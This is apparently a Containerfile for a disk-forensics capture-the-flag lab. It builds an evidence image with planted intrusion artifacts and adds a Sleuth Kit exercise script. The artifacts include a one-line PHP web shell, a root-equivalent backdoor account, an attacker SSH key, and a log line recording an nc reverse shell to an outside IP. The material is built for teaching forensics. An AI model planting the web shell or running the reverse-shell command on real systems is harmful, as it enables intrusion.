# Forensics - CTF Challenge Container
#
# Purpose: A prebuilt evidence image with planted artifacts for disk forensic analysis.
# Build:   podman build -t forensics-lab -f forensics.Containerfile .
# Run:     podman run -it --rm -v $(pwd)/evidence:/evidence forensics-lab
#
# Exercises: image hashing, partition tables, The Sleuth Kit (fls, istat, icat, ifind),
#            file carving, and MACB timeline construction.
# Evidence:  /opt/exercise/evidence_image.dd (ext4 partition at offset 1048576)
#
# WARNING: The image contains synthetic malicious artifacts. They are inert exercise
#          data, but do not expose the container network to a real network.
FROM archlinux:latest

RUN pacman -Syu --noconfirm && \
    pacman -S --noconfirm sleuthkit autopsy foremost testdisk python bash coreutils && \
    yes | pacman -Scc

# Create a synthetic disk image for forensic analysis
# This image contains planted evidence for students to discover
RUN mkdir -p /tmp/disk_build && \
    cd /tmp/disk_build && \
    dd if=/dev/zero of=disk.img bs=1M count=64 && \
    printf "g\nn\n1\n\n\nw\n" | fdisk disk.img && \
    LOOPDEV=$(losetup -f --show -o 1048576 disk.img) && \
    mkfs.ext4 -L "EVIDENCE" "$LOOPDEV" && \
    mkdir -p /mnt/disk && \
    mount "$LOOPDEV" /mnt/disk && \
    # Create normal files
    mkdir -p /mnt/disk/home/user/Documents && \
    mkdir -p /mnt/disk/home/user/Downloads && \
    mkdir -p /mnt/disk/home/user/.ssh && \
    mkdir -p /mnt/disk/etc && \
    mkdir -p /mnt/disk/var/www/html && \
    mkdir -p /mnt/disk/tmp && \
    mkdir -p /mnt/disk/var/log && \
    # Normal user files
    echo "Quarterly Report Q2 2026" > /mnt/disk/home/user/Documents/report.txt && \
    echo "Meeting notes: Discuss Q3 budget allocations" > /mnt/disk/home/user/Documents/notes.txt && \
    # SSH keys (legitimate)
    echo "ssh-ed25519 AAAAC3NzaC1lZD... user@workstation" > /mnt/disk/home/user/.ssh/authorized_keys && \
    echo "ssh-ed25519 AAAAC3NzaC1lZD... alice@workstation" >> /mnt/disk/home/user/.ssh/authorized_keys && \
    # Malicious SSH key planted by attacker
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAADA... attacker@evil.com" >> /mnt/disk/home/user/.ssh/authorized_keys && \
    # Web shell planted by attacker
    echo '<?php system($_GET["cmd"]); ?>' > /mnt/disk/var/www/html/images.php && \
    # System config files
    echo 'root:x:0:0:root:/root:/bin/bash' > /mnt/disk/etc/passwd && \
    echo 'user:x:1000:1000:User:/home/user:/bin/bash' >> /mnt/disk/etc/passwd && \
    echo 'mysql:x:27:27:MySQL:/var/lib/mysql:/bin/false' >> /mnt/disk/etc/passwd && \
    echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /mnt/disk/etc/passwd && \
    echo 'hacker:x:1001:1001:Hacker:/home/hacker:/bin/bash' >> /mnt/disk/etc/passwd && \
    # Shadow file with some passwords
    echo 'root:$6$rounds=656000$salt$MrmCCa...:19000:0:99999:7:::' > /mnt/disk/etc/shadow && \
    echo 'user:$6$rounds=656000$salt2$AbCdEf...:19000:0:99999:7:::' >> /mnt/disk/etc/shadow && \
    echo 'backdoor:$6$rounds=656000$salt3$GhIjKl...:19000:0:99999:7:::' >> /mnt/disk/etc/shadow && \
    # Auth logs with evidence of attacker activity
    printf 'Jun 25 22:15:32 server sshd[1234]: Accepted publickey for user from 185.130.5.253 port 44444 ssh2\n' > /mnt/disk/var/log/auth.log && \
    printf 'Jun 25 22:15:33 server sshd[1234]: pam_unix(sshd:session): session opened for user user by (uid=0)\n' >> /mnt/disk/var/log/auth.log && \
    printf 'Jun 25 22:16:01 server sudo:    user : TTY=pts/1 ; PWD=/home/user ; USER=root ; COMMAND=/usr/bin/whoami\n' >> /mnt/disk/var/log/auth.log && \
    printf 'Jun 25 22:16:45 server sudo:    user : TTY=pts/1 ; PWD=/home/user ; USER=root ; COMMAND=/usr/bin/passwd\n' >> /mnt/disk/var/log/auth.log && \
    printf 'Jun 25 22:17:12 server sudo:    user : TTY=pts/1 ; PWD=/home/user ; USER=root ; COMMAND=/usr/bin/nc -e /bin/bash 185.130.5.253 5555\n' >> /mnt/disk/var/log/auth.log && \
    printf 'Jun 25 22:17:30 server useradd[2345]: new user: name=hacker, UID=1001, GID=1001, home=/home/hacker, shell=/bin/bash\n' >> /mnt/disk/var/log/auth.log && \
    printf 'Jun 25 22:17:35 server passwd[2346]: password for hacker changed by root\n' >> /mnt/disk/var/log/auth.log && \
    printf 'Jun 25 22:18:00 server sshd[1235]: Accepted password for hacker from 185.130.5.253 port 55555 ssh2\n' >> /mnt/disk/var/log/auth.log && \
    printf 'Jun 25 22:18:01 server sshd[1235]: pam_unix(sshd:session): session opened for user hacker by (uid=0)\n' >> /mnt/disk/var/log/auth.log && \
    printf 'Jun 25 22:19:42 server sudo:   hacker : TTY=pts/2 ; PWD=/home/hacker ; USER=root ; COMMAND=/usr/bin/crontab -e\n' >> /mnt/disk/var/log/auth.log && \
    # Malicious cron job
    echo '*/5 * * * * root /tmp/.hidden/update.sh > /dev/null 2>&1' > /mnt/disk/tmp/.hidden_cron && \
    # Create a file that will be "deleted" (for recovery exercise)
    echo "SECRET: The exfiltration domain is exfil.evil-c2.com. 2FA backup codes: 1234-5678-9012." > /mnt/disk/tmp/stolen_credentials.txt && \
    # Cleanup and unmount
    sync && \
    umount /mnt/disk && \
    losetup -d "$LOOPDEV" && \
    # Delete the file (simulating attacker covering tracks)
    # We'll use debugfs to delete the inode but keep data blocks
    # Since debugfs is fragile, we use a simpler approach:
    # Copy the image first, then the exercise file is part of the image
    mkdir -p /opt/exercise && \
    cp disk.img /opt/exercise/evidence_image.dd && \
    # Generate a second copy with a "deleted" file scenario using extundelete-accessible data
    # We'll create a note about the deleted file
    echo "stolen_credentials.txt was DELETED by the attacker. Recover it from inode." > /opt/exercise/README_DELETED_FILE.txt && \
    rm -rf /tmp/disk_build

# On the evidence image, manually simulate a deleted file by manipulating the FS
# Actually, we use a simpler approach: mount the image, create then delete a file
RUN LOOPDEV=$(losetup -f --show -o 1048576 /opt/exercise/evidence_image.dd) && \
    mkdir -p /mnt/evidence && \
    mount "$LOOPDEV" /mnt/evidence && \
    # Create a sensitive file, then delete it (inode data blocks remain until overwritten)
    echo "CLASSIFIED: Exfiltration target is /var/lib/mysql/customers.sql. Transfer via scp to operator@185.130.5.253. Password: hunter2!" > /mnt/evidence/tmp/stolen_credentials.txt && \
    sync && \
    rm /mnt/evidence/tmp/stolen_credentials.txt && \
    sync && \
    umount /mnt/evidence && \
    losetup -d "$LOOPDEV"

COPY <<'HEREDOC' /opt/exercise/run_exercises.sh
#!/bin/bash
set -e

IMAGE="/opt/exercise/evidence_image.dd"

echo "================================================="
echo "  Forensic Analysis — Lab Exercises"
echo "================================================="
echo
echo "Evidence image: $IMAGE"
echo "Scenario: A web server was compromised. Analyze the disk image"
echo "to find evidence of the intrusion."
echo

echo "=== Exercise 1: Image Verification ==="
sha256sum "$IMAGE" > /tmp/evidence.sha256
echo "SHA256: $(cat /tmp/evidence.sha256 | awk '{print $1}')"
echo

echo "=== Exercise 2: Partition Analysis ==="
echo "Find the partition table and filesystem:"
mmls "$IMAGE"
echo
FSSTAT_OUTPUT=$(fsstat -o 1048576 "$IMAGE" 2>/dev/null)
echo "Filesystem type: $(echo "$FSSTAT_OUTPUT" | grep 'File System Type')"
echo "Volume name: $(echo "$FSSTAT_OUTPUT" | grep 'Volume Name')"

OFFSET=1048576
echo "Using offset: $OFFSET"
echo

echo "=== Exercise 3: List All Files ==="
echo "(Hint: Look in /var/www/html/ and /home/user/.ssh/)"
fls -r -o $OFFSET "$IMAGE" > /tmp/all_files.txt
SUSPICIOUS=$(grep -E '\.php|authorized_keys|passwd|shadow|auth\.log|cron' /tmp/all_files.txt || true)
echo "$SUSPICIOUS"
echo

echo "=== Exercise 4: Investigate the Web Shell ==="
echo "Find and extract the PHP file in /var/www/html/:"
PHP_INODE=$(ifind -o $OFFSET -n '/var/www/html/images.php' "$IMAGE" 2>/dev/null || echo "")
if [ -n "$PHP_INODE" ]; then
    echo "Web shell found at inode $PHP_INODE"
    echo "Content:"
    icat -o $OFFSET "$IMAGE" $PHP_INODE 2>/dev/null
fi
echo

echo "=== Exercise 5: Recover Deleted File ==="
echo "Find deleted files and recover stolen_credentials.txt:"
DELETED=$(fls -r -d -o $OFFSET "$IMAGE" 2>/dev/null | grep credentials || echo "No deleted entries found via fls")
echo "$DELETED"

echo "Searching for the file by name pattern in all inodes:"
for inode in $(ils -o $OFFSET "$IMAGE" 2>/dev/null | awk '{print $1}' | head -100); do
    FILENAME=$(istat -o $OFFSET "$IMAGE" $inode 2>/dev/null | grep -i 'stolen_credentials' || true)
    if [ -n "$FILENAME" ]; then
        echo "Found at inode $inode:"
        icat -o $OFFSET "$IMAGE" $inode 2>/dev/null
    fi
done

echo "Trying alternate recovery — check unallocated inodes near known files:"
CREDS_INODE=$(ifind -o $OFFSET -n '/tmp/stolen_credentials.txt' "$IMAGE" 2>/dev/null || echo "")
if [ -n "$CREDS_INODE" ]; then
    echo "Inode $CREDS_INODE found — attempting recovery:"
    istat -o $OFFSET "$IMAGE" $CREDS_INODE 2>/dev/null
    icat -o $OFFSET "$IMAGE" $CREDS_INODE 2>/dev/null || echo "(Data blocks may be partially overwritten)"
else
    echo "Inode not found in directory — searching unallocated space for known text:"
    strings -t d "$IMAGE" | grep -i "stolen_credentials\|CLASSIFIED\|Exfiltration target" || \
      echo "Search complete — check carved output in /opt/exercise/carved/"
fi
echo

echo "=== Exercise 6: Analyze System Logs ==="
echo "Extracting /var/log/auth.log:"
AUTH_INODE=$(ifind -o $OFFSET -n '/var/log/auth.log' "$IMAGE" 2>/dev/null || echo "")
if [ -n "$AUTH_INODE" ]; then
    icat -o $OFFSET "$IMAGE" $AUTH_INODE 2>/dev/null | tee /tmp/auth_extracted.log
    echo
    echo "--- Suspicious logins ---"
    grep "Accepted\|FAILED" /tmp/auth_extracted.log | grep -v "root" || true
    echo
    echo "--- Sudo commands ---"
    grep "COMMAND=" /tmp/auth_extracted.log || true
    echo
    echo "--- New user creation ---"
    grep "new user" /tmp/auth_extracted.log || true
fi
echo

echo "=== Exercise 7: Find Unauthorized Users ==="
echo "Extracting /etc/passwd:"
PASSWD_INODE=$(ifind -o $OFFSET -n '/etc/passwd' "$IMAGE" 2>/dev/null || echo "")
if [ -n "$PASSWD_INODE" ]; then
    icat -o $OFFSET "$IMAGE" $PASSWD_INODE 2>/dev/null
    echo
    echo "Look for: UID 0 accounts (root-equivalent), newly created users"
fi
echo

echo "=== Exercise 8: Carve Deleted Files ==="
echo "Carving files from unallocated space..."
mkdir -p /opt/exercise/carved
blkls -o $OFFSET "$IMAGE" 2>/dev/null > /tmp/unallocated.raw
foremost -t all -i /tmp/unallocated.raw -o /opt/exercise/carved/ 2>/dev/null || \
  foremost -i /tmp/unallocated.raw -o /opt/exercise/carved/ || true
echo "Carved files written to /opt/exercise/carved/"
ls -la /opt/exercise/carved/ 2>/dev/null || echo "(No files carved — check foremost output)"
echo

echo "=== Exercise 9: Timeline Construction ==="
echo "Generating MACB timeline:"
fls -m / -r -o $OFFSET "$IMAGE" > /tmp/bodyfile 2>/dev/null
mactime -b /tmp/bodyfile -z UTC 2026-06-25..2026-06-26 2>/dev/null | head -40
echo
echo "Focus on events around 2026-06-25 22:15-22:20 UTC"
echo

echo "================================================="
echo "  Investigation Summary Questions:"
echo "================================================="
echo "1. How did the attacker gain initial access?"
echo "2. What backdoor accounts were created?"
echo "3. What persistent access method was established?"
echo "4. What data did the attacker target?"
echo "5. What is the attacker's C2 IP address?"
echo "6. What evidence confirms data exfiltration?"
echo "7. What IOC can you extract from this investigation?"
echo

echo "================================================="
echo "  All Exercises Complete"
echo "================================================="
HEREDOC

RUN chmod +x /opt/exercise/run_exercises.sh

WORKDIR /opt/exercise
CMD ["/bin/bash", "-c", "./run_exercises.sh && exec /bin/bash"]
